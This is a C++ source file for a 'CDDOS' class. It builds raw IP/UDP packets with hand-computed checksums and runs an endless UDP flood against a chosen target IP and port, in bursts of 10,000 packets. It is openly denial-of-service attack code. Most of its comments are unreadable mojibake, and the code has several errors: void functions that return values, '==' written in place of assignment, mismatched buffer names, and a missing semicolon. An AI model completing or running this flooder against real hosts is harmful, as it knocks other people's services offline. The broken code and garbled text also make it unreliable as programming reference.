// DDOS.cpp: implementation of the CDDOS class.
//
//////////////////////////////////////////////////////////////////////

#include "DDOS.h"
#include <iostream.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CDDOS::CDDOS()		//���캯��
{

}
unsigned short ComputeCheckSum(unsigned short *buffer, int size)
{
	/*
    IP�ײ�У��͵ļ�����Ҫ����������λ����ȡ����������˵
	1. IPͷ����16λΪһ����λ�����ģ2�ӣ��൱����򣩣�
	2. �õ��Ľ��ȡ������ΪУ��ͷ���У����ֶΣ�
	3. ��ʼ����У����ֶ�ʱ���ֶ�ȫ����0��䣻
    �����Ƕ��ڷ�������˵��μ���У��͵ģ������ڽ�������˵����֤Ҳ�ܼ򵥣�
	1. ���ڽ��յ�IP����ͷ����16λΪ��λ�����ͣ�
	2. �����Ϊ1����У����ȷ�������������
    ԭ��ܼ򵥣����շ��ļ��������A��A�ķ�����򣬽����Ȼ��1�ˣ�

*/
      unsigned long cksum = 0;
      while(size>1)
      {
		  unsigned short num = htons(*buffer++);
		  cksum += num;
          size -= sizeof(USHORT);
      }
        if(size)
        {
			unsigned char temp = (*(UCHAR*)buffer); 
			unsigned short num = temp<<8;
            cksum += num;
        }
        cksum = (cksum>>16) + (cksum&0xffff);
        //return (USHORT)(~cksum);
		//cksum = 0xffff - cksum;
		return htons((USHORT)(~cksum));
}
void CDDOS::fill_udp_buffer(char *szDstIp,unsigned short dPort)
{
/************************************************************************/
/*          ���UDP������                                                            */
/************************************************************************/
	WSADATA wsaData;
	//��ʼ��socket.dll
	WSAStartup(MAKEWORD(2, 2),&wsaData);
	unsigned int saddr = 0;
	char hostname[MAX_PATH];			//������
	gethostname(hostname,MAX_PATH);			//���������
	LPHOSTENT lphost;

	//ͨ�������������������ϸ��Ϣ
	lphost = gethostbyname(hostname);
	if (lphost != NULL)
	{

		saddr = ((LPIN_ADDR)lphost->h_addr)->s_addr;


	}
	char pBuffer[BufferSize];		//����һ��1024�ֽڵĻ�����
	IP_HEADER ipHeader;			//IPͷ
	UDP_HEADER udpHeader;		//UDPͷ
	int iUdpCheckSumSize;
	char *ptr = NULL;
	FillMemory(pBuffer,BufferSize,'A');		//��pBuffer���ΪA
	iTotalSize = sizeof(ipHeader) + sizeof(udpHeader) + BufferSize;		//IP���ݱ��ĳ���

	//���IP�ײ�
	//���IPͷ
	ipHeader.ver_ihl = (4<<4) | (sizeof(ipHeader)/sizeof(unsigned long));    //�汾��IP�ײ�����
	ipHeader.tos = 0;       //���ַ���
	ipHeader.tlen = htons(iTotalSize);   //�ܳ���
	ipHeader.identification = 0;    //��ʶ��������ֵ
	ipHeader.flags_of = 0;    // ��־ Ƭƫ��
	ipHeader.ttl =128;  //����ʱ��
	ipHeader.proto = IPPROTO_UDP;  //Э��
	ipHeader.saddr = *(IP_ADDRESS *)&saddr;  //Դip��ַ
	unsigned long ip = inet_addr(szDstIp);
	ipHeader.daddr = *(IP_ADDRESS *)&ip;   //Ŀ��Ip��ַ
	ipHeader.crc = 0;    

	//����ipУ���
	ipHeader.crc = ComputeCheckSum((unsigned short *)&ipHeader,sizeof(ipHeader));    //�ײ�У���

	//���UDPͷ��
	udpHeader.sport = htons(5444);   //�����˿�
	udpHeader.dport = htons(dPort);  //Ŀ��˿�
	udpHeader.len = htons( sizeof(udpHeader) + BUFFERSIZE);    //����UDPͷ����UDP���ݵ��ܳ����ֽڡ�
	udpHeader.crc = 0;

	//�ڽ���TCPУ��͵ļ���ʱ����Ҫ����һ��TCPα�ײ���У���
	ZeroMemory(g_szSendBuffer,BUFFERSIZE +60);
	ptr  = g_szSendBuffer;

	//Դip��ַ
	iUdpCheckSumSize = 0;
	memcpy(ptr,&ipHeader.saddr,sizeof(ipHeader.saddr));  
	ptr += sizeof(ipHeader.saddr);
	iUdpCheckSumSize += sizeof(ipHeader.saddr);

	//Ŀ��ip��ַ
	memcpy(ptr,&ipHeader.daddr,sizeof(ipHeader.daddr));  
	ptr += sizeof(ipHeader.daddr);
	iUdpCheckSumSize += sizeof(ipHeader.daddr);

	//һ���ֽڿ��ַ�
	ptr++;
	iUdpCheckSumSize++;

	//Э��
	memcpy(ptr,&ipHeader.proto,sizeof(ipHeader.proto));  
	ptr += sizeof(ipHeader.proto);
	iUdpCheckSumSize += sizeof(ipHeader.proto);

	//udp����
	memcpy(ptr,&udpHeader.len,sizeof(udpHeader.len));  
	ptr += sizeof(udpHeader.len);
	iUdpCheckSumSize += sizeof(udpHeader.len);

	//udp������
	memcpy(ptr,szBuffer,BUFFERSIZE);
	iUdpCheckSumSize += BUFFERSIZE;

	//����У���
	udpHeader.crc = ComputeCheckSum((unsigned short*)g_szSendBuffer,iUdpCheckSumSize);

	//��䷢�ͻ�����
	memcpy(g_szSendBuffer,&ipHeader,sizeof(ipHeader));
	memcpy(g_szSendBuffer+sizeof(ipHeader),&udpHeader,sizeof(udpHeader));
	memcpy(g_szSendBuffer+sizeof(ipHeader)+sizeof(udpHeader),&szBuffer,BUFFERSIZE);
	return  true;
}
void CDDOS::udp_flood()
{
/************************************************************************/
/* UDP��ˮ����															*/

//����ԭ�����ܺ���ϵͳ���յ�һ��UDP���ݰ���ʱ������ȷ��Ŀ�ĵĶ˿����ڵȴ��е�Ӧ�ó��򣬵������ֶ˿��в�������
//          ���ڵȴ���Ӧ�ó���ʱ�����ͻ����һ��Ŀ�ĵ�ַ�޷����ӵ�ICMP���ݰ����͸���α���Դ��ַ��������ܺ��߼�
//          ��������㹻���UDP���ݰ�������ϵͳ�ͻ�̱��
/************************************************************************/

	//��ͣ��ǰ���̣���ʱ����
	Sleep(2000);
	WSADATA wsaData;

	WSAStartup(MAKEWORD(2, 2),&wsaData);
	
	SOCKET SendSocket;
	BOOL Flag;
	//����һ����ָ�����ͷ���������׽��֣�����ʧ���򷵻�
	SendSocket = WSASocket(AF_INET,SOCK_RAW,IPPROTO_UDP,NULL,0,0);
	if ( SendSocket == INVALID_SOCKET )
	{


		return;


	}
	Flag = true;
	//�����׽���ѡ��ֵ
	if (setsockopt(SendSocket,IPPROTO_UDP,IP_HDRINCL,(CHAR *)&Flag,sizeof(Flag))  == SOCKET_ERROR )
	{


		//�����׽���ѡ��ֵ�д�����
		cout<<"setsockopt Error!\n"<<endl;
		return;

	}
	SOCKADDR_IN addr_in;
	addr_in.sin_family = AF_INET;
	addr_in.sin_port = htons(tgtPort);		//���������޷��Ŷ�������ת���������ֽ�˳��Ķ˿�
	addr_in.sin_addr.S_un.s_addr = inet_addr(tgtIP);		//IP��ַ
	if (addr_in.sin_addr.s_addr == INADDR_NONE)
	{
		//���IP��ַΪ�㲥��ַ
		struct hostent *hp ==NULL;
		//���Ŀ��������Ϣ
		if ((hp == gethostbyname(tgtIP)) != NULL )
		{

			memcpy(&(addr_in.sin_addr),hp->h_addr,hp->h_length);
			addr_in.sin_family = hp->h_addrtype;

		}
		else{
			return
		}
	}
	for (;;)
	{
		//��ѭ��,ʵ�ֹ���
		if (StopFlag == 1)
		{
			ExitThread(0);
			return;
		}
		for (int i = 0;i<10000;i++)
		{
			sendto(SendSocket,pSendBuffer,iTotalSize,0,(SOCKADDR*)&addr_in,sizeof(addr_in));
		}
		Sleep(SleepTime);			//ÿ������һ�֣���ͣһ��

	}
	//�ر�Socket��������
	closesocket(SendSocket);
	return;

}


CDDOS::~CDDOS()		//��������
{

}
